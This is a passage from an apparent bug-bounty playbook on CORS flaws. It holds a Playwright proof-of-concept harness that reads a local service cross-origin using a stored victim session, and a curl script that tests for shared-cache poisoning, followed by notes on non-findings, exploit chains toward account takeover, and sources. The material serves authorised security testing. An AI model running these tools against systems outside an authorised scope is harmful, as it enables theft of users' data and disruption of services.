  // and the target receives a real cross-origin request. No page.route(): while interception is on, Playwright answers
  // CORS preflights itself. Only HDR's User-Agent is applied: a header the tool adds to the page's requests can force a
  // preflight that a real victim's browser never sends. Writes read.txt (the page text), log.txt and poc.png.
  const { chromium } = require('playwright'), https = require('https'), fs = require('fs');
  (async () => {
    const [url, file, dir, ...h] = process.argv.slice(2), u = new URL(url), E = process.env.E, st = `${E}/accounts/B.state.json`;
    let srv, args = [];
    if (file !== '-') {
      const page = fs.readFileSync(file);
      srv = https.createServer({ key: fs.readFileSync(`${E}/tools/k.pem`), cert: fs.readFileSync(`${E}/tools/c.pem`) },
        (q, r) => { r.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' }); r.end(page); }).listen(0, '127.0.0.1');
      await new Promise(r => srv.on('listening', r)); args = [`--host-resolver-rules=MAP ${u.hostname} 127.0.0.1:${srv.address().port}`];
    }
    const b = await chromium.launch({ args }), log = [`chromium ${b.version()}`], ua = h.includes('-A') ? h[h.indexOf('-A') + 1] : undefined;
    const c = await b.newContext({ storageState: fs.existsSync(st) ? st : undefined, ignoreHTTPSErrors: true, userAgent: ua }), p = await c.newPage();
    p.on('response', async s => { try { const q = s.request(); if (new URL(q.url()).origin === u.origin) return;
      const qh = await q.allHeaders(), sh = await s.allHeaders(), ck = (qh.cookie || '').split(/; */).filter(Boolean).map(x => x.split('=')[0]);
      log.push(`${q.method()} ${q.url()} ${s.status()} origin=${qh.origin || '-'} cookies=${ck.join(',') || '-'} acao=${sh['access-control-allow-origin'] || '-'} acac=${sh['access-control-allow-credentials'] || '-'}`); } catch (e) {} });
    p.on('requestfailed', q => log.push(`${q.method()} ${q.url()} failed: ${q.failure().errorText}`));
    await p.goto(url).catch(e => log.push(String(e))); await p.waitForTimeout(6000);
    fs.writeFileSync(`${dir}/read.txt`, await p.innerText('body').catch(() => '')); fs.writeFileSync(`${dir}/log.txt`, log.join('\n') + '\n');
    await p.screenshot({ path: `${dir}/poc.png`, fullPage: true }); console.log(log.join('\n')); await b.close(); if (srv) srv.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$E/tools/cor-poc.js" "https://cor008.$OOB/poc.html" - "$D" "${HDR[@]}"; cat "$D/read.txt"
  ```
  A `failed:` line naming a permission or private-network error means the browser wants the user's consent: run the
  same page in a headed browser, allow it, and say in the report that the victim must click Allow.
- **Proof:** `listening.txt` naming the product's process on the port; the service's answer to the foreign Origin;
  the public page's text with content from the local service (a version, account or device identifiers, a file
  list), the `log.txt` line with `acao=`, the browser version, and whether a permission prompt appeared.
- **Not a finding when:** the service needs a token or key the page cannot know. It serves only what the vendor
  publishes anyway. It answers only the vendor's own origins (test those with COR-003's variants). The service, or
  the name, is reachable from the internet: its data is then public to anyone and this is not the bug. A name that
  resolves to a private address of the company's own network cannot be reached from outside: N/A, at most
  `internal-info`. The read works only after the victim allows a Local Network Access prompt: report it only with
  that stated, and expect a lower rating.
- **Escalate:** a WebSocket on the same service without an `Origin` check is the WSS chapter's (#873614 reached code
  execution that way). A state-changing endpoint that a simple request reaches (no preflight) is an action any
  website takes on the victim's machine: describe it, and prove reach with a read-only call only.

### COR-009 · A shared cache stores a response whose Access-Control-Allow-Origin follows the request's Origin without keying on it, so one request sets that header for every visitor

| | |
|---|---|
| **Severity** | Low standalone: one cached URL answers every origin with ours, or with none, until it expires; Medium when the front end needs that URL cross-origin on every page |
| **Requires** | cache |
| **Excluded by** | dos, cors |
| **Unit** | host |
| **Cost** | low |
| **Weakness** | Cache Poisoning · CWE-349 |
| **Prior art** | #591302, #921704 |

- **Where:** cacheable responses that carry `Access-Control-Allow-Origin` (applicability probe, step 2) and a cache
  status header: public API reads the front end loads cross-origin (`/wp-json/` on WordPress, configuration and
  translation files, fonts, static JSON), anything served with `Cache-Control: public` or `s-maxage`. Several CDNs
  ignore `Vary: Origin` unless `Origin` is in the configured cache key, so the header alone settles nothing.
- **Test:** the server builds `Access-Control-Allow-Origin` from the request's `Origin`, and the cache stores the
  first answer under a key that leaves `Origin` out. Fill a key only we use (a unique cache buster) with a foreign
  Origin, then ask for it as the front end would: if the cached answer names our origin, the browser of every reader
  of that URL refuses it until the entry expires. The reverse holds too: a key filled without `Origin` is stored
  without the header.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/COR-009"; mkdir -p "$D"
  R=$(printf '%s' "$H" | awk -F. '{print $(NF-1)"."$NF}'); F="https://app.$R"   # the front-end origin that reads this host (applicability probe, step 4)
  P="/wp-json/"                                # a cacheable path whose response carries Access-Control-Allow-Origin
  c() { curl -sS "${HDR[@]}" "$@" -o /dev/null -D- | tr -d '\r' |
        grep -i -E '^(HTTP/|access-control-allow-origin|vary|age|x-cache|cf-cache-status|cache-control)' | paste -sd ' ' -; sleep 1; }
  # 1. safety: the buster must be part of the key, or step 2 would fill the URL real users load. A fresh buster answered
  #    from the cache (HIT, Age above 0) means the query is not keyed: stop here.
  K="cor009=$RANDOM$RANDOM"; c "$T$P?$K" | tee "$D/0-keyed.txt"; c "$T$P?$K" | tee -a "$D/0-keyed.txt"; c "$T$P?cor009=$RANDOM$RANDOM" | tee -a "$D/0-keyed.txt"
  # 2. our own key, filled with a foreign Origin, then asked for with the front end's Origin
  O="https://cor009-$RANDOM.example"; K="cor009=$RANDOM$RANDOM"
  c -H "Origin: $O" "$T$P?$K" | tee "$D/1-foreign.txt"
  c -H "Origin: $F" "$T$P?$K" | tee "$D/2-front-end.txt"      # a cache hit naming $O here is the finding
  # 3. the reverse: a key filled without Origin, then asked for with the front end's Origin
  K="cor009=$RANDOM$RANDOM"; c "$T$P?$K" | tee "$D/3-none.txt"; c -H "Origin: $F" "$T$P?$K" | tee "$D/4-front-end.txt"
  ```
- **Proof:** `1-foreign.txt` and `2-front-end.txt`: the same busted URL, the second request carrying the front end's
  Origin answered from the cache (`Age` above 0, `X-Cache: HIT` or `CF-Cache-Status: HIT`) with
  `Access-Control-Allow-Origin` naming our origin; or `4-front-end.txt` answered from the cache with no such header;
  `0-keyed.txt` showing the buster is part of the key; and a statement that only our own busted URLs were filled.
- **Not a finding when:** the second answer is a miss, or names the front end's own origin: `Origin` is in the key,
  or nothing is stored. The header is a constant (`*`, or one fixed origin): every client gets the same thing. The
  response is cached privately (`Cache-Control: private`): a browser's cache is per user and partitioned by site.
  The front end never reads this URL cross-origin: nothing breaks. The policy excludes denial of service (`dos`) or
  CORS findings without data theft (`cors`).
- **Escalate:** describe the effect on the real URL and stop: filling a key real users load is denial of service,
  even where `dos-ok` is set. An `Origin` value that also changes the body, and other unkeyed headers that do, are
  the CCH chapter's cards.

## Graveyard

- **A header with nothing private behind it** (`cors`). `Access-Control-Allow-Origin: *`, or an echoed origin, on
  public content, configuration, a logged-out page or the requester's own IP address. #879582's summary says the
  read exposed the user's IP address and had no impact; #1113759 was closed because the information was public and
  the site out of scope.
- **`*` with `Access-Control-Allow-Credentials: true`** (`cors`). Browsers refuse a wildcard on a credentialed
  response and send no cookie on an uncredentialed request: nothing private is readable.
- **A wildcard read "through the cache".** Reading a victim's cached credentialed response with an uncredentialed
  `fetch(..., {cache: "force-cache"})` from another site no longer works: Chromium, Firefox and Safari partition the
  HTTP cache by top-level site. A shared cache that hands one user's page to another is cache deception (CCH
  chapter): curl reads it, and no CORS is needed.
- **A curl-only proof** (`cors`, `automated`). curl sends any Origin and ignores SameSite. Without a page that
  worked in a current browser the report is N/A; the usual reason the page fails is B's cookie (`Lax`, `Strict` or
  no attribute).
- **Origins no attacker's browser can produce**: a backtick, a brace or a space in a host name; the company's own
  app schemes (`capacitor://localhost`, `ionic://localhost`, `app://`); a path or a query inside `Origin`. Only curl
  or the company's app sends them.
- **Trust in `http://` origins** (`mitm`): exploiting it needs a network position.
- **Trust in `localhost` or private addresses** with no way to run script there on the victim's machine: low or
  informative.
- **"Any subdomain is trusted"** with no foothold (`cors`): a header observation until script runs on a sibling
  (COR-004).
- **Extension origins** (`social-engineering`): the victim must install the attacker's extension; paid where the
  product is itself an extension (#412490).
- **CORS on a third-party service under the company's domain** (`third-party`): a help desk, status page or
  marketing platform answering for itself.
- **Missing `Vary: Origin` with no shared cache, or on `private` or `no-store` responses** (`missing-headers`):
  nothing stores the wrong header.
- **One policy, many endpoints.** The rule is middleware: one report for the host; the rest close as duplicates.
- **Not this chapter**: postMessage origin checks (CSD chapter), WebSocket `Origin` checks (WSS chapter), data read
  through a script tag or JSONP (CSR-012), Flash `crossdomain.xml` and Silverlight `clientaccesspolicy.xml` (no
  current browser runs them: N/A).

## Chains

- XSS on a sibling (XSS cards) and STO-003 to STO-005 (a claimed sibling) → COR-004: script on a trusted origin
  reads this host with B's cookies in every browser. STO-010 adds the parent-domain cookies the claimed host
  receives.
- COR-001, COR-002, COR-003, COR-005 → COR-006: an accepted origin plus a response holding a credential is account
  takeover.
- COR-006 (a CSRF token read) → CSR-008: the e-mail, password and second-factor changes with the token supplied.
- COR-007 is the case the CSRF chapter rules out: JSON and custom-header requests need a preflight, and here the
  server approves it. API-006 and GQL-008 are the same requests sent with no preflight at all.
- GQL: an endpoint under COR-001's policy turns every query into a cross-site read and, with COR-007, every mutation
  into a cross-site write.
- API chapter: the more a read endpoint returns, the higher the CORS read rates (#924951's summary: the profile API
  returned more personal information than necessary).
- COR-009 and the CCH chapter share the cache-key analysis; an unkeyed header that changes the body is a CCH card.
- COR-008 → WSS chapter: a local WebSocket server that ignores `Origin` (#873614 reached code execution through
  one); CSD chapter for local pages that trust `postMessage`.
- OAU-001: a claimed or trusted sibling that receives authorization codes is the same misplaced trust on the
  sign-in side.

## Sources

- `kb/reports/cors.md` and `kb/reports/all/cors.md`: the disclosed reports this chapter is built from.
- HexBrain: `get_testing_playbook {"topic":"CORS"}`, `find_bypasses {"protection":"cors origin allow-list"}`, `find_payloads {"topic":"CORS Misconfiguration"}`.
- PortSwigger Web Security Academy, Cross-origin resource sharing (CORS); OWASP WSTG-CLNT-07; PayloadsAllTheThings,
  CORS Misconfiguration.
- James Kettle, "Exploiting CORS misconfigurations for Bitcoins and bounties" (2016); Corben Leo, "Advanced CORS
  Exploitation Techniques" (2018).
- WHATWG Fetch Standard (the CORS protocol, credentials mode, the preflight and the `*` rules); RFC 6265bis
  (`SameSite`); the WICG Private Network Access and Local Network Access explainers.
